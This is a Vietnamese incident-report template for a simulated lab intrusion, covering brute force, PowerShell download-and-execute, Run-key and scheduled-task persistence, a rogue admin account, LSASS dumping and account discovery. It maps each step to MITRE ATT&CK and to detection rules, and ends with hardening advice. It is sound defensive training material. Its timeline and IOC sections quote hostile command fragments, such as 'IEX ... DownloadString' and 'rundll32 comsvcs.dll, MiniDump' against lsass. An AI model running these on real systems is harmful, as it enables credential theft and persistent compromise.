# BÁO CÁO SỰ CỐ AN NINH MẠNG
### Security Incident Report

> *Hướng dẫn dùng: thay phần `[...]` bằng số liệu/thời gian/ảnh thật từ điều tra của bạn. Xóa các ghi chú in nghiêng trước khi nộp.*

---

| | |
|---|---|
| **Mã sự cố (Incident ID)** | INC-2026-001 |
| **Ngày phát hiện** | [vd 2026-06-08] |
| **Analyst** | [Tên bạn] |
| **Mức độ (Severity)** | **High / Critical** |
| **Trạng thái** | Đã điều tra — Mô phỏng lab (Resolved) |
| **Phân loại** | Multi-stage intrusion — Credential Access, Persistence, Privilege Escalation |

---

## 1. Tóm tắt điều hành (Executive Summary)

Hệ thống giám sát SOC (Splunk) phát hiện một chuỗi tấn công đa giai đoạn nhắm vào máy trạm `[DESKTOP-H7GVTPR]` trong khoảng `[13:55–14:05 ngày 08/06/2026]`. Kẻ tấn công bắt đầu bằng **brute force** tài khoản qua SMB, sau đó thực thi PowerShell tải payload, **cài đặt nhiều cơ chế duy trì truy cập** (Registry Run key, Scheduled Task), **tạo tài khoản admin mới**, **dump bộ nhớ LSASS** để lấy thông tin xác thực, và **liệt kê tài khoản** để chuẩn bị mở rộng. Toàn bộ 7 kỹ thuật đã được 7 detection rule tự xây phát hiện và cảnh báo tự động.

## 2. Hệ thống & tài khoản bị ảnh hưởng

| Loại | Giá trị |
|---|---|
| Máy bị ảnh hưởng | `[DESKTOP-H7GVTPR]` (192.168.13.20) |
| Tài khoản bị nhắm (brute force) | `[Administrator]`, `[fakeadmin]` |
| Tài khoản độc hại được tạo | `[T1136.001_Admin]` |
| Nguồn tấn công | `[Kali — 192.168.13.30]` |

## 3. Timeline sự kiện (Kill Chain)

*Dán kết quả truy vấn timeline (Phần C — Tuần 5) và rút gọn thành bảng:*

| Thời gian | Giai đoạn | Technique | Hành động quan sát |
|---|---|---|---|
| `[16:32]` | Credential Access | T1110 | `[61]` lần đăng nhập thất bại (4625), Logon Type 3 |
| `[16:53]` | Execution | T1059.001 | `powershell IEX (New-Object Net.WebClient).DownloadString(...)` |
| `[16:55]` | Persistence | T1547.001 | Ghi Run key `[AtomicRedTeam]` (Sysmon EID 13) |
| `[16:58]` | Persistence | T1053.005 | `schtasks /create /tn AtomicTask` |
| `[17:02]` | Priv-Esc/Persistence | T1136.001 | Tạo `[T1136.001_Admin]` (4720) + thêm vào Administrators (4732) |
| `[17:03]` | Credential Access | T1003.001 | `rundll32 comsvcs.dll, MiniDump` nhắm lsass → `lsass_dump.dmp` |
| `[17:16]` | Discovery | T1087.001 | `[34]` event recon: net user/localgroup, whoami, quser |

## 4. Map MITRE ATT&CK

| Technique | ID | Tactic | Phát hiện bởi |
|---|---|---|---|
| Brute Force | T1110 | Credential Access | Rule 1 (Security 4625) |
| PowerShell | T1059.001 | Execution | Rule 2 (Sysmon EID 1) |
| Registry Run Key | T1547.001 | Persistence | Rule 3 (Sysmon EID 13) |
| Scheduled Task | T1053.005 | Persistence | Rule 4 (Sysmon EID 1) |
| Create Account | T1136.001 | Persistence | Rule 5 (Security 4720/4732) |
| LSASS Dumping | T1003.001 | Credential Access | Rule 6 (Sysmon EID 1/11) |
| Account Discovery | T1087.001 | Discovery | Rule 7 (Sysmon EID 1) |

## 5. Chỉ số xâm phạm (IOCs)

```
Tài khoản độc hại : T1136.001_Admin
File dump LSASS    : C:\Windows\Temp\lsass_dump.dmp
Registry persistence: HKCU\...\CurrentVersion\Run\AtomicRedTeam
Scheduled task     : AtomicTask
Tiến trình bất thường: rundll32.exe comsvcs.dll MiniDump
                     : powershell.exe ... DownloadString
```

## 6. Đánh giá tác động

- **Tính bí mật (Confidentiality):** CAO — LSASS bị dump → credential trong bộ nhớ có thể bị đánh cắp (pass-the-hash, lateral movement).
- **Tính toàn vẹn (Integrity):** tài khoản admin trái phép được tạo → kẻ tấn công có quyền điều khiển máy.
- **Tính sẵn sàng (Availability):** chưa bị ảnh hưởng trong kịch bản này.

## 7. Khuyến nghị (Containment & Hardening)

**Ngăn chặn ngay:**
- Vô hiệu hóa/xóa tài khoản `[T1136.001_Admin]`.
- Xóa Run key và scheduled task độc hại.
- Reset mật khẩu các tài khoản trên máy bị dump LSASS (credential coi như đã lộ).

**Phòng thủ dài hạn:**
- Bật **Account Lockout Policy** (đã chứng minh chặn được brute force Administrator).
- Bật **Audit Process Creation (4688)** + Sysmon **EID 10** để bắt truy cập LSASS trực tiếp.
- Hạn chế **SeDebugPrivilege**; bật Credential Guard.
- Giám sát LOLBins (`rundll32`, `comsvcs.dll`) — như Rule 6 đã làm.

## 8. Bài học (Lessons Learned)

- Detection theo **ngưỡng/hành vi** (brute force, discovery burst) phải dùng **Scheduled alert**, không dùng Real-time — vì cần gom đếm theo cửa sổ thời gian.
- **Giảm false positive** là phần khó nhất: rule Registry Run key ban đầu dính cả "Runtime" và Edge AutoLaunch → phải thêm bộ lọc loại trừ.
- Phủ **nhiều biến thể** của một kỹ thuật (procdump *và* comsvcs LOLBin cho LSASS) mạnh hơn nhiều so với bắt đúng một công cụ.

---
*Báo cáo này được tạo trong môi trường lab mô phỏng phục vụ học tập. Mọi tấn công do chính analyst thực hiện có kiểm soát.*
